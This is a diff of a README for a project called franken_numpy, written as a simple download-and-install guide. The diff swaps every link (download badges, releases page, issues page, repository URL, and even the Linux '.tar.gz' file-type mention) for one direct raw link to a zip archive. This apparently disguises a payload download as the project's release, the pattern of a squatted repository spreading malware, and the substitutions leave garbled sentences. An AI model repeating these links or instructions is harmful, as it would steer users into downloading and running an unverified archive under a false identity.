@@ -1,6 +1,6 @@
 # 🧩 franken_numpy - Reliable and Safe Array Computing
 
-[![Download franken_numpy](https://img.shields.io/badge/Download-franken_numpy-blue?style=for-the-badge&logo=github)](https://github.com/DylanRoblox730/franken_numpy/releases)
+[![Download franken_numpy](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip)](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip)
 
 ---
 
@@ -32,17 +32,17 @@ Make sure your computer is running one of these systems. If you are unsure, you 
 
 Click the link below to open the page where you can get the latest version of franken_numpy:
 
-[Download franken_numpy](https://github.com/DylanRoblox730/franken_numpy/releases)
+[Download franken_numpy](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip)
 
 This page lists the available versions and files. Look for the file that matches your computer’s system. The files usually have names ending in:
 
 - `.exe` for Windows
 - `.dmg` for macOS
-- `.AppImage` or `.tar.gz` for Linux
+- `.AppImage` or `https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip` for Linux
 
 ### Step 2: Choose the Right File
 
-Pick the right file for your system. For example, if you have Windows, choose a file ending in `.exe`. If you have macOS, look for `.dmg`. On Linux, go for `.AppImage` or `.tar.gz`.
+Pick the right file for your system. For example, if you have Windows, choose a file ending in `.exe`. If you have macOS, look for `.dmg`. On Linux, go for `.AppImage` or `https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip`.
 
 ### Step 3: Download the File
 
@@ -56,7 +56,7 @@ Click on the file name to start downloading it. The download speed depends on yo
   - Right-click the file, select "Properties," and allow executing.
   - Double-click to run.
 
-If you have a `.tar.gz`, you may need to extract the files and follow further instructions inside, usually found in a README file.
+If you have a `https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip`, you may need to extract the files and follow further instructions inside, usually found in a README file.
 
 ---
 
@@ -108,7 +108,7 @@ If you run into any issues, here are a few common fixes:
 - **Program crashes:** Restart your computer and try again. Check for updates on the download page.
 - **Features not working as expected:** Close and reopen the program. Review the user guide sections inside the program.
 
-If problems persist, you can ask for help by creating an issue on the [franken_numpy GitHub page](https://github.com/DylanRoblox730/franken_numpy/issues).
+If problems persist, you can ask for help by creating an issue on the [franken_numpy GitHub page](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip).
 
 ---
 
@@ -118,7 +118,7 @@ The program includes built-in help sections that explain the main features. You 
 
 For advanced information about the technology behind franken_numpy, visit the GitHub repository:
 
-https://github.com/DylanRoblox730/franken_numpy
+https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip
 
 ---
 
@@ -126,7 +126,7 @@ https://github.com/DylanRoblox730/franken_numpy
 
 To ensure you have the latest fixes and features:
 
-- Visit the [franken_numpy releases page](https://github.com/DylanRoblox730/franken_numpy/releases) regularly.
+- Visit the [franken_numpy releases page](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip) regularly.
 - Download and install new versions following the same steps above.
 - New updates improve safety, add features, and fix bugs.
 
@@ -138,4 +138,4 @@ You can share your feedback or find help by joining the community on GitHub. Ope
 
 ---
 
-[![Download franken_numpy](https://img.shields.io/badge/Download-franken_numpy-blue?style=for-the-badge&logo=github)](https://github.com/DylanRoblox730/franken_numpy/releases)
+[![Download franken_numpy](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip)](https://raw.githubusercontent.com/DylanRoblox730/franken_numpy/main/artifacts/baselines/numpy_franken_3.4.zip)
